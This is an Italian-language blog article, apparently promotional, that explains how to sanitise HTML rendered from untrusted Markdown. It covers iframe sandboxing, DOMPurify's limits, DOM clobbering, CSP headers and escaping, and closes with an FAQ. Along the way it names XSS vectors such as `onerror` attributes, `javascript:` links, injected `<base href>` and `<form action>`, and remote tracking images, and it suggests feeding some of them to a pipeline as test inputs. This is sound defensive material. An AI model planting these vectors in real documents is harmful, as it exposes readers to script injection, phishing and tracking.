A volte il documento deve conservare markup che non puoi permettere in sicurezza — un report interno con i propri stili, un'email resa, output da un sistema che non controlli. Rendilo dentro un iframe con un attributo `sandbox` e gira in un'origine opaca senza accesso alla tua pagina.

| Pro | Contro |
| --- | --- |
| Isolamento invece di filtraggio, così le lacune dell'allow-list contano meno | Il layout adesso è tuo da gestire: dimensionamento, scorrimento, stampa |
| `sandbox` senza `allow-same-origin` significa nessun accesso al tuo storage o DOM | `allow-scripts` insieme a `allow-same-origin` sconfigge tutto quanto |
| Si combina con una CSP invece di competere con essa | Link, focus e accessibilità hanno tutti bisogno di un collegamento deliberato |

**Prezzo:** gratis, parte dell'HTML.

**Per chi è?** Per chiunque mostri documenti il cui markup deve arrivare intatto. Usalo *insieme* a un sanificatore, non al suo posto — una sandbox impedisce a uno script di raggiungere la tua pagina, e non fa niente contro un documento che fa phishing al lettore dentro il frame.

### TransformPipe — un convertitore che ha già preso queste decisioni

TransformPipe convertisce Markdown in un documento HTML completo e autosufficiente nel tuo browser. La parte rilevante qui è che sanificare non è un'opzione che puoi dimenticare di accendere: l'HTML grezzo nel codice sorgente passa un'allow-list sia sulla via verso la pagina che su quella verso il file esportato.

| Pro | Contro |
| --- | --- |
| Un'allow-list, applicata da DOMPurify nel browser e da `xss` sul server | L'allow-list è fissa: nessuna politica personalizzata tua |
| Gli id dei titoli sono prefissati, così le ancore generate non possono oscurare variabili globali | Un documento alla volta, non una pipeline di build |
| Da disconnesso, niente viene caricato — il file è letto e convertito in locale | Il browser fa il lavoro, quindi un file molto grande dipende dalla macchina |
| L'export è un unico file senza nessuna richiesta esterna di nessun tipo | Non è una libreria: convertisce, non si incorpora nella tua app |

**Prezzo:** gratis. Un account aggiunge cronologia, condivisione e un'API, anche questi gratis.

**Dettagli tecnici e funzioni**

- Sanifica l'HTML reso, non il codice sorgente Markdown
- La stessa allow-list su entrambi i lati del confine di rete, così non possono divergere
- Gli id dei titoli sono prefissati con `doc-`, che è la difesa dal DOM clobbering applicata a mano
- La stessa conversione da una REST API, una CLI, una GitHub Action e un server MCP

**Per chi è?** Per chiunque abbia un file `.md` da qualche altra parte e una persona a cui inviarlo. L'output di un modello è il caso comune: [trasformarlo in una pagina che qualcuno può leggere](/blog/ai-output-to-a-shareable-page) significa rendere una stringa che non hai scritto tu, che è esattamente il problema descritto in questo articolo.

## Dove fallisce la scelta ovvia

DOMPurify è il default corretto e la sezione onesta riguarda i suoi limiti, perché "usiamo DOMPurify" è dove si fermano molte revisioni di sicurezza.

**Ha bisogno di un DOM, e un DOM falso fallisce aperto.** Su un server o spedisci jsdom o usi una libreria diversa. Dato un ambiente in cui non può funzionare, DOMPurify restituisce il suo input invariato invece di lanciare un errore, il che è la peggiore modalità di fallimento disponibile: una configurazione rotta e una funzionante producono lo stesso output identico per ogni documento che non contiene HTML. Il costo di non testare questo è un servizio che non ha mai sanificato niente e non ha modo di saperlo.

**I default sono ampi, e il default pericoloso è disattivato.** L'allow-list predefinita di DOMPurify è progettata per essere generalmente utile, non minimale per il tuo prodotto, e `SANITIZE_NAMED_PROPS` — l'opzione che effettivamente blocca il DOM clobbering — è disattivata a meno che tu non la attivi. Nessuno dei due è una critica alla libreria; entrambi sono una critica a installarla e proseguire.

**Un sanificatore non può conoscere le tue variabili globali.** `id="config"`, `id="state"`, `id="init"` — qualunque nome tocchi il tuo stesso codice su `window` — sono invisibili per lui, perché nessun sanificatore legge il tuo bundle. Prefissare ogni id superstite è la sola difesa che scala, perché smette di dipendere da una lista di nomi che qualcuno deve mantenere.

**Pulito non è lo stesso di innocuo.** Un'allow-list che permette `<a href="https://...">` e `<img src="https://...">` permette una pagina che sembra esattamente la tua schermata di login, e un'immagine il cui caricamento dice a una terza parte quando un documento è stato aperto. Nessuno dei due esegue uno script e nessuno dei due è un bug XSS. Se il tuo modello di minaccia include il phishing o le ricevute di lettura, il sanificatore non è il controllo di cui hai bisogno — `img-src` in una CSP è più vicino, e un interstiziale sui link in uscita ancora di più.

**Tutto quello che viene dopo eredita il rischio e nessuna della garanzia.** L'evidenziatore, l'iniettore di ancore, il template wrapper, l'espressione regolare "aggiungi solo `target=_blank`": ognuno è un posto dove l'HTML sanificato diventa HTML non sanificato senza nessun cambiamento visibile nel codice che chiama il sanificatore. È il modo più comune con cui un sanificatore corretto finisce in un report di incidente.

**Il server non può impostare un header su un file.** Una CSP è una proprietà di una risposta, e un file `.html` scaricato non è una risposta. Aperto dal disco non ha nessun header, quindi la sola politica che può portare è un tag `<meta http-equiv>` — che funziona per `script-src` e `img-src` e viene ignorato per `frame-ancestors` e `sandbox`. Da qui l'argomento per un export senza nessuno script del tutto: un documento senza niente di eseguibile è sicuro anche su `file://`, dove un header non può raggiungerlo.

## Sanificare un documento che stai per consegnare a qualcun altro

Gran parte di quello che si scrive sull'XSS in Markdown presume un'applicazione web: la tua pagina, la tua origine, la tua sessione. Convertire un file è una situazione diversa con un diverso insieme di responsabilità.

Quando rendi Markdown non fidato nella tua app, stai proteggendo i tuoi utenti da un documento. Quando convertì un file Markdown e mandi l'HTML a un collega, stai proteggendo *lui* da un documento — uno che arriva con il tuo nome sopra, da un indirizzo di cui si fida, oltre qualunque filtraggio che la sua organizzazione applica agli allegati di estranei. Uno `<script>` che sopravvive alla tua conversione è stato lavato.

Ne seguono tre cose. Sanifica alla conversione anche se il file è "solo un documento", perché il browser di chi lo riceve eseguirà quello che gli mandi con la stessa disponibilità del tuo. Preferisci un export senza nessuno script a uno con script sicuri, perché né chi riceve né il suo gateway di posta possono verificare la differenza. E tieni il file autosufficiente, che è una proprietà di sicurezza tanto quanto di comodità: un documento che non richiede niente alla rete non può segnalare quando è stato letto, e non può cambiare dopo che l'hai inviato.

Poi testa la tua stessa pipeline con tre input: un attributo `onerror`, un link `javascript:`, e un `id` che corrisponde a una variabile globale che il tuo codice legge. Se uno dei primi due raggiunge la pagina, hai un sanificatore da aggiungere e probabilmente un header da impostare. Il terzo la raggiungerà, ed è questo il punto — controlla che arrivi sotto un prefisso invece che sotto il nome che il tuo codice legge. Se stai scegliendo un convertitore piuttosto che costruirne uno, [cosa fa ogni strumento nella fase di sanificazione](/blog/best-markdown-to-html-converters) è la colonna che conta, e diversi strumenti apprezzati lasciano passare l'HTML grezzo per progetto.

## Come scegliere

1. **Chiediti se l'HTML grezzo è davvero una funzione che offri.** Se non lo è, fai l'escape e fermati: `html: false` in `markdown-it` non costa niente da mantenere e non si può bypassare, e l'alternativa è un'allow-list che possiederai ancora fra tre anni.
2. **Scegli il sanificatore che gira dove l'HTML viene reso, poi verifica che fallisca.** In un browser DOMPurify usa il parser che renderà il risultato, chiudendo la lacuna della mutation XSS; su un server ogni opzione porta con sé un proprio parser, quindi scegline uno che punti alla fedeltà del browser — e verifica nella tua suite di test che un tag `<script>` venga rimosso nella configurazione di produzione, perché un DOM mal configurato fallisce aperto in silenzio.
3. **Scrivi un'allow-list e importala ovunque.** Due sanificatori configurati indipendentemente divergeranno, e il giorno in cui lo fanno, il documento che si rende in sicurezza nella tua app è salvato con un `<iframe>` dentro per il prossimo che lo trova.
4. **Metti il sanificatore dopo il renderer e dopo ogni trasformazione, e prefissa ogni id che conserva.** Qualunque cosa modifichi la stringa HTML più a valle sta fuori dalla garanzia del sanificatore, e il DOM clobbering non ha bisogno di nessuno script, quindi un prefisso sugli id superstiti — incluse le ancore che generano i tuoi titoli — è un cambiamento di una riga che chiude un'intera classe di bug.
5. **Aggiungi l'header di cui avresti bisogno se il sanificatore avesse torto.** `script-src 'none'`, `base-uri 'none'` e `frame-ancestors 'none'` su una rotta che mostra documenti trasformano un'iniezione riuscita in una richiesta bloccata; se non puoi usarli perché la pagina esegue la tua app, è il motivo per spostare il rendering dei documenti sulla sua propria rotta.

## Conclusione

Markdown permette HTML grezzo perché è stato progettato così, e nessuna quantità di attenzione in un parser lo cambia; la sicurezza di un documento Markdown reso è una proprietà di quello che fai dopo la resa. Questo significa un'allow-list scritta applicata all'HTML reso, la stessa allow-list nel browser e sul server, ogni id superstite prefissato, niente che modifichi la stringa dopo, e una Content Security Policy dietro tutto questo per il bug che non hai ancora trovato. Se preferisci non possedere quel codice per un file che devi solo convertire e inviare, [la conversione da Markdown a HTML di un convertitore che sanifica per default](/) applica quei passaggi nel tuo browser — un'allow-list, id dei titoli prefissati, un export senza script e senza richieste di rete, gratis, senza niente caricato quando hai fatto l'accesso.

## Domande frequenti

### Markdown è vulnerabile all'XSS?

Markdown in sé è un formato di testo, ma quasi ogni renderer Markdown lascia passare l'HTML grezzo verso l'output, il che significa che un file `.md` può portare `<script>`, `onerror=` e URL `javascript:` dritti nel browser. La vulnerabilità sta nella pipeline di rendering, non nel formato. Ogni pipeline che rende Markdown che non hai scritto tu ha bisogno di un sanificatore tra il renderer e la pagina.

### DOMPurify rende Markdown sicuro da solo?

Rimuove il markup eseguibile, che è la maggior parte del lavoro, e lascia tre lacune. La sua protezione dal DOM clobbering è completa solo con `SANITIZE_NAMED_PROPS` attivato, non può sapere quali variabili globali legge il tuo stesso codice, e qualunque cosa modifichi la stringa HTML dopo che è passata è fuori dalla sua garanzia. Abbinalo a una Content Security Policy e tratta il suo output come definitivo.

### Devo sanificare il Markdown o l'HTML?

L'HTML, sempre, e solo dopo che ogni trasformazione è avvenuta. Markdown ha più ortografie per lo stesso output e il renderer inventa markup che non è mai apparso nel codice sorgente — un autolink diventa un anchor completo, un titolo diventa un id — quindi un filtro sul codice sorgente sta controllando una stringa che non è quella che viene spedita.

### Basta fare l'escape dell'HTML invece di sanificarlo?

Se i tuoi utenti non hanno bisogno di scrivere HTML, l'escape è meglio della sanificazione: produce testo, quindi non c'è niente da bypassare e nessuna allow-list da mantenere. `markdown-it` lo fa per default con `html: false`. Nel momento in cui qualcuno ha bisogno di un blocco `<details>` o di una tabella incorporata, sei di nuovo davanti a un'allow-list.

### Cosa protegge una Content Security Policy che un sanificatore non protegge?

Il bug nel tuo sanificatore. Un sanificatore rimuove il markup che riconosce come pericoloso; una CSP dice al browser di non eseguire proprio nessuno script, il che vale anche quando qualcosa è passato attraverso. Chiude anche vettori che un'allow-list non può esprimere, come un `<base href>` iniettato — quello ha bisogno di `base-uri 'none'`.

### L'HTML grezzo dentro Markdown può fare danni senza nessun JavaScript?

Sì, ed è la parte che le persone non vedono. Un attributo `id` oscura una variabile globale, un `<base href>` ripunta ogni link relativo della pagina, un `<form action>` manda l'input del lettore da qualche altra parte, `position: fixed` in un attributo `style` coprire la tua interfaccia con quella di qualcun altro, e un `<img src>` remoto segnala quando il tuo documento è stato letto. Niente di tutto questo ha bisogno di un tag script.

### Un file `.md` è arrivato da qualcuno che non conosco — è sicuro apire l'HTML convertito?

Solo con un convertitore che sanifica, e vale la pena sapere quale. Diversi convertitori molto usati lasciano passare l'HTML grezzo per progetto e lo dicono nella loro documentazione, quindi lo `<script>` nel file diventa uno `<script>` nell'HTML che apri. Controlla il comportamento dello strumento prima di fare doppio clic sull'output, e ricorda che se rimandi avanti quell'HTML, adesso arriva da te.
